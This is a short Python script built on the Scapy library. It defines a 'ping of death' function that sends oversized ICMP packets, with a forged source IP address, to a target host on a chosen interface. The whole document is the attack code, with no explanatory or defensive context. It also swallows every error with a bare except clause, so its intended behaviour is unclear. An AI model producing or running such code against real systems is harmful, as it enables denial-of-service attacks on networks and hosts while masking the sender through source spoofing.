from scapy.all import IP, ICMP, send

def run_ping_of_death(ip_dst, iface):
    packet = IP(src="10.0.0.99", dst=ip_dst)/ICMP()/("oops" * 10000)
    try:
        send(packet, count=-1, iface=iface, verbose=0)
    except:
        return True